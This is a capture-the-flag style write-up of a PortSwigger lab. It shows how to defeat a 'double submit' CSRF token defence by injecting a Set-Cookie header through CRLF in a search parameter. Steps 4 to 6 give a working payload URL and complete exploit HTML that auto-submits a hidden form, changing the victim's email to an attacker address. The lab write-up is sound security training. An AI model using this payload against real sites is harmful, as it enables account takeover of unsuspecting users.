
# #PortSwigger 


![[Pasted image 20260509233242.png]]


---

**Description**
	*Use the exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address. The server uses the insecure **"double submit"** CSRF prevention technique where the token in the cookie must match the token in the request body.

**Your credentials:** `wiener:peter`*

#### Vulnerability Explanation

The server uses the **double submit cookie** pattern:
- A CSRF token is stored in a **cookie** (`csrf=TOKEN_VALUE`)
- The **same token** must also be submitted in the request body (`csrf=TOKEN_VALUE`)
- The server validates that both values match

**The flaw:** If you can inject a cookie with a value you control, you can set both the cookie and body parameter to the same value (e.g., `fake`), bypassing the CSRF protection.

Additionally, there is a **CRLF injection** vulnerability in the search functionality that allows you to inject cookies.


---


## Solution Steps

### Step 1: Log in and Capture the Email Change Request

1. Log in to your account using `wiener:peter`
2. Submit the **"Update email"** form
3. Capture the request in **Burp Proxy** (HTTP history)

The request shows:

![[Pasted image 20260509233847.png]]






### Step 2: Understand the Double Submit Validation

Send the request to Burp Repeater and test:

| Cookie Value | Body Parameter       | Result     |
| ------------ | -------------------- | ---------- |
| REAL_TOKEN   | REAL_TOKEN           | Accepted   |
| REAL_TOKEN   | DIFFERENT            | Rejected   |
| DIFFERENT    | DIFFERENT (matching) | Let's test |

The validation simply checks that **cookie value == body parameter value**.

![[Pasted image 20260509234417.png]]






### Step 3: Find CRLF Injection for Cookie Injection

1. Perform a **search** (any term like `test`)
2. Send the search request to Burp Repeater
3. Observe that the search term gets **reflected in the `Set-Cookie` header**
![[Pasted image 20260509234612.png]]

This is a **CRLF injection** vulnerability! You can inject newline characters (`%0d%0a`) to add arbitrary headers, including `Set-Cookie`.






### Step 4: Create Cookie Injection URL

Create a URL that injects a **fake `csrf` cookie** into the victim's browser:
```
https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

**Decoded version:**
```
/?search=test\r\nSet-Cookie: csrf=fake; SameSite=None
```






### Step 5: Build the Complete Exploit

Create an exploit that:
1. Injects the `csrf=fake` cookie using the search vulnerability
2. Submits the email change form with `csrf=fake` in the body

```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="fake">
    <input type="hidden" name="email" value="hacked@attacker.com">
</form>
```






### Step 6: Complete Exploit HTML

```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit - Double Submit Cookie</title>
</head>
<body>
    <!-- CRLF injection to set csrf=fake cookie -->
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
         onerror="document.forms[0].submit();">
    
    <!-- CSRF form with matching fake token -->
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
        <input type="hidden" name="csrf" value="fake">
        <input type="hidden" name="email" value="pwned@attacker.com">
    </form>
</body>
</html>
```







### Step 7: Upload to Exploit Server

1. Go to the **exploit server**
2. Paste your exploit HTML into the **"Body"** section
3. Click **"Store"**

![[Pasted image 20260509234941.png]]





### Step 8: Test and Deliver

1. **Test on yourself first** — click "View exploit"
2. Verify your email changes (you'll need to log in again)
3. **Change the email address** to something different (not your own)
4. Click **"Deliver to victim"**
5. The lab is marked as **Solved**

![[Pasted image 20260509235010.png]]


---
